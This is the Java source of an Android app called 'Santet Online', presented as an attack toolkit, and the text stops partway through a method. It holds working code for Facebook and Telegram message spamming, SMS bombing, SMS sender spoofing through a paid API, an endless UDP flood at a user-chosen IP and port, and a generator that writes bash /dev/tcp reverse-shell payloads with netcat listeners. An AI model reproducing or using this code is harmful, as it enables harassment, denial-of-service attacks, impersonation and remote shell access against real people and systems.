package sec.blackhole.santet;

import android.app.*;
import android.os.*;
import android.graphics.drawable.*;
import android.graphics.*;
import android.view.View.*;
import android.view.*;
import android.content.*;
import android.text.*;
import android.widget.*;
import java.io.*;
import java.util.*;
import org.json.*;
import android.telephony.*;
import java.security.*;
import java.net.*;
import android.view.inputmethod.*;
import org.apache.commons.codec.binary.Base64;
import java.util.regex.*;
import com.google.android.gms.security.*;
import javax.net.ssl.*;
import java.nio.charset.*;
import android.net.*;

public class MainActivity extends Activity 
{
	final Context context = this;
	private ScrollView tscroll;
	private TextView console;
	private FBSpamTask fbTask;
	private SMSBombTask smsbTask;
	private SMSSpoofTask smssTask;
	private UDPFloodTask udpfTask;
	private TGSpamTask tgsTask;
	
	public void scrollDown() {
		tscroll.post(new Runnable() {
			@Override
			public void run() {
				tscroll.fullScroll(tscroll.FOCUS_DOWN);
			}
		});
	}
	public void banner() {
		console.append("          ,       \n");
		console.append("      _,-\"\"-._    \n");
		console.append("    ,'        '.  \n");
		console.append(Html.fromHtml("<font color='white'>&nbsp;&nbsp;&nbsp;/&nbsp;<font color='red'>&nbsp;&nbsp;&nbsp;,-,&nbsp;&nbsp;,-</font><font color='white'>&nbsp;\\&nbsp;</font><br/>"));
		console.append(Html.fromHtml("<font color='white'>&nbsp;&nbsp;|&nbsp;&nbsp;<font color='red'>&nbsp;&nbsp;/&nbsp;&nbsp;&nbsp;\\&nbsp;|&nbsp;o|&nbsp;</font><br/>"));
		console.append(Html.fromHtml("<font color='white'>&nbsp;&nbsp;\\&nbsp;&nbsp;<font color='red'>&nbsp;&nbsp;`-o-'&nbsp;&nbsp;`-'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(&nbsp;)_&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(&nbsp;)_&nbsp;<br/>"));
		console.append(Html.fromHtml("<font color='white'>&nbsp;&nbsp;&nbsp;`,&nbsp;&nbsp;&nbsp;_.--'`'--`<font color='red'>&nbsp;&nbsp;___&nbsp;&nbsp;&nbsp;&nbsp;_&nbsp;_&nbsp;&nbsp;&nbsp;___&nbsp;&nbsp;|&nbsp;,_)&nbsp;&nbsp;&nbsp;__&nbsp;&nbsp;|&nbsp;,_)<br/>"));
		console.append(Html.fromHtml("<font color='white'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`--`---'&nbsp;&nbsp;<font color='red'>&nbsp;&nbsp;&nbsp;/',__)&nbsp;/'_`&nbsp;)/'&nbsp;_&nbsp;`\\|&nbsp;|&nbsp;&nbsp;&nbsp;/'__`\\|&nbsp;|&nbsp;&nbsp;<br/>"));
		console.append(Html.fromHtml("<font color='white'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;,'&nbsp;'&nbsp;&nbsp;&nbsp;&nbsp;<font color='red'>&nbsp;&nbsp;&nbsp;\\__,&nbsp;\\(&nbsp;(_|&nbsp;||&nbsp;(&nbsp;)&nbsp;||&nbsp;|_&nbsp;(&nbsp;&nbsp;___/|&nbsp;|_&nbsp;<br/>"));
		console.append(Html.fromHtml("<font color='white'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;./&nbsp;,&nbsp;&nbsp;`,&nbsp;&nbsp;<font color='red'>&nbsp;&nbsp;&nbsp;(____/`\\__,_)(_)&nbsp;(_)`\\__)`\\____)`\\__)<br/>"));
		console.append(Html.fromHtml("<font color='white'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/&nbsp;/&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\\&nbsp;&nbsp;<font color='white'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Made&nbsp;with&nbsp;<font color='red'>❤️</font><font color='white'>&nbsp;by&nbsp;BlackHoleSec</font><br/>"));
		console.append("    (_)))_ _,\" \n");
		console.append("        ||||        DedSecTL - Cvar1984 - ITermSec\n");
		console.append("       _||||_,      CiKu370  - amsitlab - X14N23N6\n");
		console.append("------(_,-._)))-----------------------------------------");
		scrollDown();
	}
	public class FBSpamTask extends AsyncTask <String, String, String>
	{
		private AlertDialog.Builder pdia;
		private AlertDialog dialog;
		
		LayoutInflater pdiafi = LayoutInflater.from(context);
		View pdiavi = pdiafi.inflate(R.layout.loading, null);

		final TextView loadingTitle = (TextView) pdiavi.findViewById(R.id.loadingTitle);
		final TextView loadingText = (TextView) pdiavi.findViewById(R.id.loadingText);
		final Button stopBtn = (Button) pdiavi.findViewById(R.id.stopBtn);
		
		@Override
		protected void onPreExecute()
		{
			loadingTitle.setText("FB Spam Message Attack");
			pdia = new AlertDialog.Builder(context);
			pdia.setView(pdiavi);
			pdia.setCancelable(false);
			stopBtn.setText("Stop Spam");
			stopBtn.setOnClickListener(new OnClickListener() {
				@Override
				public void onClick(View view) {
					fbTask.cancel(true);
					dialog.dismiss();
				}
			});
			dialog = pdia.create();
			dialog.show();
			super.onPreExecute();
		}
		@Override
		protected void onProgressUpdate(String[] values)
		{
			super.onProgressUpdate(values);
			loadingText.setText(values[0]);
		}
		@Override
		protected String doInBackground(String[] params)
		{
			String recipient_id = params[0];
			int count_num = new Integer(params[1]);
			String message_text = params[2];
			try {
				Scanner sc_0 = new Scanner(new File("/sdcard/Santet-Online/user-agent.txt"), "UTF-8");
				sc_0.useDelimiter("$^");
				String user_agent = sc_0.next().toString();
				Scanner sc_1 = new Scanner(new File("/sdcard/Santet-Online/token.log"), "UTF-8");
				sc_1.useDelimiter("$^");
				String access_token = sc_1.next().toString();
				for(int x = 0;x < count_num;x++) {
					if(fbTask.isCancelled()) {
						break;
					}
					JSONObject objData = new JSONObject();
					objData.put("access_token",access_token);
					objData.put("recipient",new JSONObject().put("id",recipient_id));
					objData.put("message",new JSONObject().put("text",message_text));
					HttpURLConnection conn = (HttpURLConnection) new URL("https://graph.facebook.com/v5.0/me/messages").openConnection();
					conn.setDoOutput(true);
					conn.setConnectTimeout(2000);
					conn.setRequestMethod("POST");
					conn.setRequestProperty("Content-Type","application/json");
					conn.setRequestProperty("Content-Length",String.valueOf((objData.toString()).length()));
					conn.setRequestProperty("User-Agent",user_agent);
					conn.connect();
					OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream());
					writer.write(objData.toString());
					writer.flush();writer.close();
					if(conn.getResponseCode() == 200) {
						publishProgress(String.format("Sent %d to %s", x+1, recipient_id));
					}
					conn.disconnect();
				}
			} catch(Exception e) {
				e.printStackTrace();
			}
			return null;
		}
		@Override
		protected void onPostExecute(String result) { dialog.dismiss(); }
	}
	public class SMSBombTask extends AsyncTask<String, Void, String>
	{
		private AlertDialog.Builder pdia;
		private AlertDialog dialog;
		
		LayoutInflater pdiafi = LayoutInflater.from(context);
		View pdiavi = pdiafi.inflate(R.layout.loading, null);
		
		final TextView loadingTitle = (TextView) pdiavi.findViewById(R.id.loadingTitle);
		final TextView loadingText = (TextView) pdiavi.findViewById(R.id.loadingText);
		final Button stopBtn = (Button) pdiavi.findViewById(R.id.stopBtn);

		@Override
		protected void onPreExecute()
		{
			loadingTitle.setText("SMS Bomber Attack Vectors");
			pdia = new AlertDialog.Builder(context);
			pdia.setView(pdiavi);
			pdia.setCancelable(false);
			stopBtn.setText("Stop Bomb");
			stopBtn.setOnClickListener(new OnClickListener() {
				@Override
				public void onClick(View view) {
					smsbTask.cancel(true);
					dialog.dismiss();
				}
			});
			dialog = pdia.create();
			dialog.show();
			super.onPreExecute();
		}
		@Override
		protected String doInBackground(String[] params)
		{
			String recipient_phone = params[0];
			int count_num = new Integer(params[1]);
			String message_text = params[2];
			SmsManager smsManager = SmsManager.getDefault();
			for(int x = 0;x < count_num;x++) {
				try {
					if(smsbTask.isCancelled()) {
						break;
					}
					loadingText.setText(String.format("Sent %d to %s", x+1, recipient_phone));
					smsManager.sendTextMessage(recipient_phone, null, message_text, null, null);
					try{Thread.sleep(1000);}catch(Exception e){e.printStackTrace();}
				} catch(Exception e) {
					e.printStackTrace();
				}
			}
			return null;
		}
		@Override
		protected void onPostExecute(String result) { dialog.dismiss(); }
	}
	public class SMSSpoofTask extends AsyncTask<String, String, String>
	{
		private AlertDialog.Builder pdia;
		private AlertDialog dialog;
		
		LayoutInflater pdiafi = LayoutInflater.from(context);
		View pdiavi = pdiafi.inflate(R.layout.loading, null);
		
		final TextView loadingTitle = (TextView) pdiavi.findViewById(R.id.loadingTitle);
		final TextView loadingText = (TextView) pdiavi.findViewById(R.id.loadingText);
		final Button stopBtn = (Button) pdiavi.findViewById(R.id.stopBtn);
		
		@Override
		protected void onPreExecute()
		{
			loadingTitle.setText("SMS Spoof Attack Vectors");
			pdia = new AlertDialog.Builder(context);
			pdia.setView(pdiavi);
			pdia.setCancelable(false);
			stopBtn.setOnClickListener(new OnClickListener() {
				@Override
				public void onClick(View view) {
					smssTask.cancel(true);
					dialog.dismiss();
				}
			});
			dialog = pdia.create();
			dialog.show();
			super.onPreExecute();
		}
		@Override
		protected void onProgressUpdate(String[] values) {
			super.onProgressUpdate(values);
			loadingText.setText(values[0]);
		}
		@Override
		protected String doInBackground(String[] params)
		{
			try {
				String encodedData = String.format("to=%s&from=%s&message=%s", URLEncoder.encode(params[2]), URLEncoder.encode(params[3]), URLEncoder.encode(params[4]));
				String authData = String.valueOf(Base64.encodeBase64((params[0]+":"+params[1]).getBytes(StandardCharsets.UTF_8)));
				HttpURLConnection conn = (HttpURLConnection) new URL("https://api.46elks.com/a1/SMS").openConnection();
				conn.setDoOutput(true);
				conn.setConnectTimeout(2000);
				conn.setRequestMethod("POST");
				conn.setRequestProperty("Content-Type","x-www-form-urlencoded");
				conn.setRequestProperty("Content-Length",String.valueOf(encodedData.length()));
				conn.setRequestProperty("Authorization","Basic "+authData);
				conn.connect();
				OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream());
				writer.write(encodedData);
				writer.flush();writer.close();
				publishProgress(String.format("Sent message to %s", params[2]));
			} catch(Exception e) {
				e.printStackTrace();
			}
			return null;
		}
		@Override
		protected void onPostExecute(String result) { dialog.dismiss(); }
	}
	public class UDPFloodTask extends AsyncTask<String, String, String>
	{
		private AlertDialog.Builder pdia;
		private AlertDialog dialog;
		
		LayoutInflater pdiafi = LayoutInflater.from(context);
		View pdiavi = pdiafi.inflate(R.layout.loading, null);
		
		final TextView loadingTitle = (TextView) pdiavi.findViewById(R.id.loadingTitle);
		final TextView loadingText = (TextView) pdiavi.findViewById(R.id.loadingText);
		final Button stopBtn = (Button) pdiavi.findViewById(R.id.stopBtn);
		
		@Override
		protected void onPreExecute()
		{
			loadingTitle.setText("UDP Flood Attack");
			pdia = new AlertDialog.Builder(context);
			pdia.setView(pdiavi);
			pdia.setCancelable(false);
			stopBtn.setText("Stop Flood");
			stopBtn.setOnClickListener(new OnClickListener() {
				@Override
				public void onClick(View view) {
					udpfTask.cancel(true);
					dialog.dismiss();
				}
			});
			dialog = pdia.create();
			dialog.show();
			super.onPreExecute();
		}
		@Override
		protected void onProgressUpdate(String[] values)
		{
			super.onProgressUpdate(values);
			loadingText.setText(values[0]);
		}
		@Override
		protected String doInBackground(String[] params)
		{
			int count = 1;
			byte[] buffer = new byte[65507];
			SecureRandom random = new SecureRandom();
			try {
				DatagramSocket socket = new DatagramSocket();
				InetAddress address = InetAddress.getByName(params[0]);
				random.nextBytes(buffer);
				DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, new Integer(params[1]));
				while(true) {
					if(udpfTask.isCancelled()) {
						socket.close();
						break;
					}
					socket.send(packet);
					publishProgress(String.format("Sent %s packet to %s", count, address));
					count++;
				}
			} catch(Exception e) {
				e.printStackTrace();
			}
			return null;
		}
		@Override
		protected void onPostExecute(String result) { dialog.dismiss(); }
	}
	public class TGSpamTask extends AsyncTask<String, String, String>
	{
		private AlertDialog.Builder pdia;
		private AlertDialog dialog;
		
		LayoutInflater pdiafi = LayoutInflater.from(context);
		View pdiavi = pdiafi.inflate(R.layout.loading, null);
		
		final TextView loadingTitle = (TextView) pdiavi.findViewById(R.id.loadingTitle);
		final TextView loadingText = (TextView) pdiavi.findViewById(R.id.loadingText);
		final Button stopBtn = (Button) pdiavi.findViewById(R.id.stopBtn);

		@Override
		protected void onPreExecute()
		{
			loadingTitle.setText("TG Spam Message Attack");
			pdia = new AlertDialog.Builder(context);
			pdia.setView(pdiavi);
			pdia.setCancelable(false);
			stopBtn.setText("Stop Spam");
			stopBtn.setOnClickListener(new OnClickListener() {
				@Override
				public void onClick(View view) {
					tgsTask.cancel(true);
					dialog.dismiss();
				}
			});
			dialog = pdia.create();
			dialog.show();
			super.onPreExecute();
		}

		@Override
		protected void onProgressUpdate(String[] values)
		{
			super.onProgressUpdate(values);
			if(values[0].equals("messageLong")) {
				Toast t = Toast.makeText(getApplicationContext(), "Bad Request: message is too long", Toast.LENGTH_SHORT);
				t.setGravity(Gravity.CENTER, 0, 0);
				t.show();
			}
		}
		@Override
		protected String doInBackground(String[] params)
		{
			try {
				for(int x = 0;x < Integer.valueOf(params[3]);x++) {
					if(tgsTask.isCancelled()) {
						break;
					}
					String encodedData = String.format("chat_id=%s&parse_mode=%s&text=%s", URLEncoder.encode(params[0],"UTF-8"), URLEncoder.encode(params[1],"UTF-8"), URLEncoder.encode(params[2],"UTF-8"));
					HttpURLConnection conn = (HttpURLConnection) new URL(String.format("https://api.telegram.org/bot%s/sendMessage", params[4])).openConnection();
					conn.setDoInput(true);
					conn.setDoOutput(true);
					conn.setConnectTimeout(2000);
					conn.setRequestMethod("POST");
					conn.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
					conn.setRequestProperty("Content-Length",String.valueOf(encodedData.length()));
					conn.connect();
					OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream());
					writer.write(encodedData);
					writer.flush();writer.close();
					loadingText.setText(String.format("Sent %d messages to %s",x+1,params[0]));
					InputStream is = conn.getInputStream();
					InputStreamReader isr = new InputStreamReader(is);
					BufferedReader br = new BufferedReader(isr);
					String inputLine,body="";
					while((inputLine=br.readLine()) != null) {
						body+=inputLine+"\n";
					}
					br.close();
					conn.disconnect();
					if(Pattern.compile(Pattern.quote("Bad Request: message is too long")).matcher(body).find()) {
						publishProgress("messageLong");
						break;
					}
				}
			} catch(Exception e) {
				e.printStackTrace();
			}
			return null;
		}
		@Override
		protected void onPostExecute(String result) { dialog.dismiss(); }
	}
    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
		try {
			ProviderInstaller.installIfNeeded(getApplicationContext());
			SSLContext sslContext;
			sslContext = SSLContext.getInstance("TLSv1.2");
			sslContext.init(null, null, null);
			sslContext.createSSLEngine();
		} catch(Exception e) {
			e.printStackTrace();
		}
		if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {                
			getWindow().setNavigationBarColor(Color.parseColor("#FF0F00"));
		}
		setTitle("Santet Online");
		getActionBar().setBackgroundDrawable(new ColorDrawable(Color.parseColor("#FF0F00")));
		findViewById(R.id.paylist).setOnClickListener(paylist);
		findViewById(R.id.fbspam).setOnClickListener(fbspam);
		findViewById(R.id.smsbomb).setOnClickListener(smsbomb);
		findViewById(R.id.smsspoof).setOnClickListener(smsspoof);
		findViewById(R.id.udpflood).setOnClickListener(udpflood);
		findViewById(R.id.tgspam).setOnClickListener(tgspam);
		tscroll = (ScrollView) findViewById(R.id.tscroll);
		console = (TextView) findViewById(R.id.console);
		banner();
		Typeface tf = Typeface.createFromAsset(getAssets(), "ubuntu.ttf");
		console.setTypeface(tf);
		console.setTextSize(11);
		File santetOnline = new File("/sdcard/Santet-Online");
		if(santetOnline.exists()) {
			if(santetOnline.isFile()) {
				santetOnline.delete();
				santetOnline.mkdir();
			}
		} else {
			santetOnline.mkdir();
		}
		File userAgent = new File("/sdcard/Santet-Online/user-agent.txt");
		if(userAgent.exists()) {
			if(userAgent.isDirectory()) {
				userAgent.delete();
				try {
					FileOutputStream out = new FileOutputStream(userAgent);
					out.write("Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36 OPR/44.6.2246.127414".getBytes());
					out.close();
				} catch(Exception e) {
					e.printStackTrace();
				}
			}
		} else {
			try {
				FileOutputStream out = new FileOutputStream(userAgent);
				out.write("Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36 OPR/44.6.2246.127414".getBytes());
				out.close();
			} catch(Exception e) {
				e.printStackTrace();
			}
		}
		File parseMode = new File("/sdcard/Santet-Online/parse-mode.txt");
		if(parseMode.exists()) {
			if(parseMode.isDirectory()) {
				parseMode.delete();
				try {
					FileOutputStream out = new FileOutputStream(parseMode);
					out.write("markdown".getBytes());
					out.close();
				} catch(Exception e) {
					e.printStackTrace();
				}
			}
		} else {
			try {
				FileOutputStream out = new FileOutputStream(parseMode);
				out.write("markdown".getBytes());
				out.close();
			} catch(Exception e) {
				e.printStackTrace();
			}
		}
	}
	View.OnClickListener paylist = new View.OnClickListener() {
		@Override
		public void onClick(View view) {
			final EditText input = new EditText(MainActivity.this);
			input.setBackgroundColor(Color.parseColor("#1C1C1C"));
			input.setTextColor(Color.parseColor("#FF0F00"));
			input.setHint("IP ADDRESS:PORT");
			input.setHintTextColor(Color.parseColor("#FF0F00"));
			input.setSingleLine(true);
			input.setGravity(Gravity.CENTER);
			AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
			builder.setTitle(Html.fromHtml("<body bgcolor='black'>Payload and Listener Generator</body>"));
			builder.setView(input);
			builder.setPositiveButton("[ Payload ]", new DialogInterface.OnClickListener() {
				@Override
				public void onClick(DialogInterface dialogInterface, int whichButton) {
					input.onEditorAction(EditorInfo.IME_ACTION_DONE);
					if(input.getText().toString().split(":").length == 2) {
						try {
							File payloadFile = new File(String.format("/sdcard/Santet-Online/payload-%s.sh", input.getText().toString().split(":")[0]));
							if(payloadFile.isDirectory()) {
								payloadFile.delete();
							}
							String payloadText = String.format("bash -i >& /dev/tcp/%s/%s 0>&1", input.getText().toString().split(":")[0],input.getText().toString().split(":")[1]);
							FileOutputStream out = new FileOutputStream(payloadFile);
							out.write(payloadText.getBytes());
							out.close();
							Intent intent = new Intent(Intent.ACTION_SEND);
							intent.putExtra(Intent.EXTRA_TEXT, payloadText);
							intent.putExtra(Intent.EXTRA_STREAM, payloadFile);
							intent.setType("text/*");
							startActivity(intent);
						} catch(Exception e) {
							e.printStackTrace();
						}
					}
				}
			});
			builder.setNegativeButton("[ Listener ]", new DialogInterface.OnClickListener() {
				@Override
				public void onClick(DialogInterface dialogInterface, int whichButton) {
					input.onEditorAction(EditorInfo.IME_ACTION_DONE);
					if(input.getText().toString().split(":").length == 2) {
						try {
							File listenerFile = new File(String.format("/sdcard/Santet-Online/listen-%s.sh",input.getText().toString().split(":")[0]));
							if(listenerFile.isDirectory()) {
								listenerFile.delete();
							}
							String listenerText = String.format("nc -lvp %s %s", input.getText().toString().split(":")[1], input.getText().toString().split(":")[0]);
							FileOutputStream out = new FileOutputStream(listenerFile);
							out.write(listenerText.getBytes());
							out.close();
							Intent intent = new Intent(Intent.ACTION_SEND);
							intent.putExtra(Intent.EXTRA_TEXT, listenerText);
							intent.putExtra(Intent.EXTRA_STREAM, listenerFile);
							intent.setType("text/*");
							startActivity(intent);
						} catch(Exception e) {
							e.printStackTrace();
						}
					}
				}
			});
			AlertDialog dialog = builder.show();
			dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.parseColor("#FF0F00")));
			dialog.getButton(AlertDialog.BUTTON_POSITIVE).setTextColor(Color.parseColor("#FF0F00"));
			dialog.getButton(AlertDialog.BUTTON_POSITIVE).setBackgroundDrawable(new ColorDrawable(Color.parseColor("#1C1C1C")));
			dialog.getButton(AlertDialog.BUTTON_NEGATIVE).setTextColor(Color.parseColor("#FF0F00"));
			dialog.getButton(AlertDialog.BUTTON_NEGATIVE).setBackgroundDrawable(new ColorDrawable(Color.parseColor("#1C1C1C")));
		}
	};
	View.OnClickListener fbspam = new View.OnClickListener() {
		@Override
		public void onClick(View view) {
			LayoutInflater fbspamli = LayoutInflater.from(context);
			View fbspamvi = fbspamli.inflate(R.layout.fbspam, null);
			
			AlertDialog.Builder builder = new AlertDialog.Builder(context);
			builder.setView(fbspamvi);
			final EditText accessToken = (EditText) fbspamvi.findViewById(R.id.accessToken);
			final EditText userAgent = (EditText) fbspamvi.findViewById(R.id.userAgent);
			final EditText recipientId = (EditText) fbspamvi.findViewById(R.id.recipientId);
			final EditText count = (EditText) fbspamvi.findViewById(R.id.count);
			final EditText message = (EditText) fbspamvi.findViewById(R.id.message);
			final Button setBtn = (Button) fbspamvi.findViewById(R.id.setBtn);
			final Button spamBtn = (Button) fbspamvi.findViewById(R.id.spamBtn);
			
			new Thread(new Runnable() {
				@Override
				public void run() {
					File tokenlog = new File("/sdcard/Santet-Online/token.log");
					if(tokenlog.exists()) {
						if(tokenlog.isDirectory()) {
							tokenlog.delete();
						} else {
							try {
								Scanner sc = new Scanner(new File("/sdcard/Santet-Online/token.log"), "UTF-8");
								sc.useDelimiter("$^");
								String tokenLog = sc.next();
								accessToken.setText(tokenLog);
							} catch(Exception e) {
								e.printStackTrace();
							}
						}
					}
					File userlog = new File("/sdcard/Santet-Online/user-agent.txt");
					if(userlog.exists()) {
						if(userlog.isDirectory()) {
							userlog.delete();
						} else {
							try {
								Scanner sc = new Scanner(new File("/sdcard/Santet-Online/user-agent.txt"), "UTF-8");
								sc.useDelimiter("$^");
								String userLog = sc.next();
								userAgent.setText(userLog);
							} catch(Exception e) {
								e.printStackTrace();
							}
						}
					}
				}
			}).run();
			
			setBtn.setOnClickListener(new OnClickListener() {
				@Override
				public void onClick(View view) {
					try {
						FileOutputStream accessTokenFile = new FileOutputStream("/sdcard/Santet-Online/token.log");
						accessTokenFile.write(accessToken.getText().toString().getBytes());
						accessTokenFile.close();
						FileOutputStream userAgentFile = new FileOutputStream("/sdcard/Santet-Online/user-agent.txt");
						userAgentFile.write(userAgent.getText().toString().getBytes());
						userAgentFile.close();
						Toast t = Toast.makeText(getApplicationContext(), "Settings has been applied!", Toast.LENGTH_SHORT);
						t.setGravity(Gravity.CENTER,0,0);
						t.show();
					} catch(Exception e) {
						e.printStackTrace();
					}
				}
			});
			final AlertDialog dialog = builder.create();
			dialog.show();
			spamBtn.setOnClickListener(new OnClickListener() {
				@Override
				public void onClick(View view) {
					dialog.dismiss();
					fbTask = new FBSpamTask();
					fbTask.execute(recipientId.getText().toString(), count.getText().toString(), message.getText().toString());
				}
			});
		}
	};
	View.OnClickListener smsbomb = new View.OnClickListener() {
		@Override
		public void onClick(View view) {
			LayoutInflater smsbombfi = LayoutInflater.from(context);
			View smsbombvi = smsbombfi.inflate(R.layout.smsbomb, null);
			
			final EditText phone_number = (EditText) smsbombvi.findViewById(R.id.recipientId);
			final EditText count = (EditText) smsbombvi.findViewById(R.id.count);
			final EditText message = (EditText) smsbombvi.findViewById(R.id.message);
			final Button bombBtn = (Button) smsbombvi.findViewById(R.id.bombBtn);
			
			AlertDialog.Builder builder = new AlertDialog.Builder(context);
			builder.setView(smsbombvi);
			final AlertDialog dialog = builder.create();
			dialog.show();
			bombBtn.setOnClickListener(new OnClickListener() {
				@Override
				public void onClick(View view) {
					dialog.dismiss();
					smsbTask = new SMSBombTask();
					smsbTask.execute(phone_number.getText().toString(),count.getText().toString(),message.getText().toString());
				}
			});
		}
	};
	View.OnClickListener smsspoof = new View.OnClickListener() {
		@Override
		public void onClick(View view) {
			LayoutInflater smssfi = LayoutInflater.from(context);
			View smssvi = smssfi.inflate(R.layout.smsspoof, null);
			
			final EditText username = (EditText) smssvi.findViewById(R.id.username);
			final EditText password = (EditText) smssvi.findViewById(R.id.password);
			final EditText to = (EditText) smssvi.findViewById(R.id.to);
			final EditText from = (EditText) smssvi.findViewById(R.id.from);
			final EditText message = (EditText) smssvi.findViewById(R.id.message);
			final Button setBtn = (Button) smssvi.findViewById(R.id.setBtn);
			final Button sendBtn = (Button) smssvi.findViewById(R.id.sendBtn);
			
			new Thread(new Runnable() {
				@Override
				public void run() {
					File usernameFile = new File("/sdcard/Santet-Online/username.txt");
					File passwordFile = new File("/sdcard/Santet-Online/password.txt");
					if(usernameFile.exists()) {
						if(usernameFile.isDirectory()) {
							usernameFile.delete();
						} else {
							try {
								Scanner sc = new Scanner(usernameFile, "UTF-8");
								sc.useDelimiter("$^");
								username.setText(sc.next().toString());
							} catch(Exception e) {
								e.printStackTrace();
							}
						}
					}
					if(passwordFile.exists()) {
						if(passwordFile.isDirectory()) {
							passwordFile.delete();
						} else {
							try {
								Scanner sc = new Scanner(passwordFile, "UTF-8");
								sc.useDelimiter("$^");
								password.setText(sc.next().toString());
							} catch(Exception e) {
								e.printStackTrace();
							}
						}
					}
				}
			}).run();
			
			setBtn.setOnClickListener(new OnClickListener() {
				@Override
				public void onClick(View view) {
					try {
						FileOutputStream usernameFile = new FileOutputStream("/sdcard/Santet-Online/username.txt");
						usernameFile.write(username.getText().toString().getBytes());
						usernameFile.close();
						FileOutputStream passwordFile = new FileOutputStream("/sdcard/Santet-Online/password.txt");
						passwordFile.write(password.getText().toString().getBytes());
						passwordFile.close();
						Toast t = Toast.makeText(getApplicationContext(), "Settings has been applied!", Toast.LENGTH_SHORT);
						t.setGravity(Gravity.CENTER, 0, 0);
						t.show();
					} catch(Exception e) {
						e.printStackTrace();
					}
				}
			});
			
			sendBtn.setOnClickListener(new OnClickListener() {
				@Override
				public void onClick(View view) {
					smssTask = new SMSSpoofTask();
					smssTask.execute(username.getText().toString(),password.getText().toString(),to.getText().toString(),from.getText().toString(),message.getText().toString());
				}
			});
			
			AlertDialog.Builder builder = new AlertDialog.Builder(context);
			builder.setView(smssvi);
			AlertDialog dialog = builder.create();
			dialog.show();
		}
	};
	View.OnClickListener udpflood = new View.OnClickListener() {
		@Override
		public void onClick(View view) {
			final EditText input = new EditText(MainActivity.this);
			input.setBackgroundColor(Color.parseColor("#1C1C1C"));
			input.setTextColor(Color.parseColor("#FF0F00"));
			input.setHint("IP ADDRESS:PORT");
			input.setHintTextColor(Color.parseColor("#FF0F00"));
			input.setSingleLine(true);
			input.setGravity(Gravity.CENTER);
			AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
			builder.setTitle(Html.fromHtml("<body bgcolor='black'>UDP Flood Attack</body>"));
			builder.setView(input);
			builder.setPositiveButton("[ Start ]", new DialogInterface.OnClickListener() {
				@Override
				public void onClick(DialogInterface dialogInterface, int whichButton) {
					input.onEditorAction(EditorInfo.IME_ACTION_DONE);
					udpfTask = new UDPFloodTask();
					udpfTask.execute(input.getText().toString().split(":")[0], input.getText().toString().split(":")[1]);
				}
			});
			AlertDialog dialog = builder.show();
			dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.parseColor("#FF0F00")));
			dialog.getButton(AlertDialog.BUTTON_POSITIVE).setTextColor(Color.parseColor("#FF0F00"));
			dialog.getButton(AlertDialog.BUTTON_POSITIVE).setBackgroundDrawable(new ColorDrawable(Color.parseColor("#1C1C1C")));
			dialog.getButton(AlertDialog.BUTTON_NEGATIVE).setTextColor(Color.parseColor("#FF0F00"));
			dialog.getButton(AlertDialog.BUTTON_NEGATIVE).setBackgroundDrawable(new ColorDrawable(Color.parseColor("#1C1C1C")));
		}
	};
	View.OnClickListener tgspam = new View.OnClickListener() {
		@Override
		public void onClick(View view) {
			LayoutInflater tgspamli = LayoutInflater.from(context);
			View tgspamvi = tgspamli.inflate(R.layout.tgspam, null);
			
			final EditText botToken = (EditText) tgspamvi.findViewById(R.id.botToken);
			final EditText parseMode = (EditText) tgspamvi.findViewById(R.id.parseMode);
			final Button setBtn = (Button) tgspamvi.findViewById(R.id.setBtn);
			final EditText chatid = (EditText) tgspamvi.findViewById(R.id.chatid);
			final EditText count = (EditText) tgspamvi.findViewById(R.id.count);
			final EditText message = (EditText) tgspamvi.findViewById(R.id.message);
			final Button spamBtn = (Button) tgspamvi.findViewById(R.id.spamBtn);
			
			new Thread(new Runnable() {
				@Override
				public void run() {
					File botTokenFile = new File("/sdcard/Santet-Online/bot-token.txt");
					if(botTokenFile.exists()) {
						if(botTokenFile.isDirectory()) {
							botTokenFile.delete();
						} else {
							try {
								Scanner sc = new Scanner(botTokenFile, "UTF-8");
								sc.useDelimiter("$^");
								botToken.setText(sc.next().toString());
							} catch(Exception e) {
								e.printStackTrace();
							}
						}
					}
					File parseModeFile = new File("/sdcard/Santet-Online/parse-mode.txt");
					if(parseModeFile.exists()) {
						if(parseModeFile.isDirectory()) {
							parseModeFile.delete();
						} else {
							try {
								Scanner sc = new Scanner(parseModeFile, "UTF-8");
								sc.useDelimiter("$^");
								parseMode.setText(sc.next().toString());
							} catch(Exception e) {
								e.printStackTrace();
							}
						}
					}
				}
			}).run();
			
			AlertDialog.Builder builder = new AlertDialog.Builder(context);
			builder.setView(tgspamvi);
			final AlertDialog dialog = builder.create();
			dialog.show();
			setBtn.setOnClickListener(new OnClickListener() {
				@Override
				public void onClick(View view)  {
					try {
						FileOutputStream botTokenFile = new FileOutputStream("/sdcard/Santet-Online/bot-token.txt");
						botTokenFile.write(botToken.getText().toString().getBytes());
						botTokenFile.close();
						FileOutputStream parseModeFile = new FileOutputStream("/sdcard/Santet-Online/parse-mode.txt");
						parseModeFile.write(parseMode.getText().toString().getBytes());
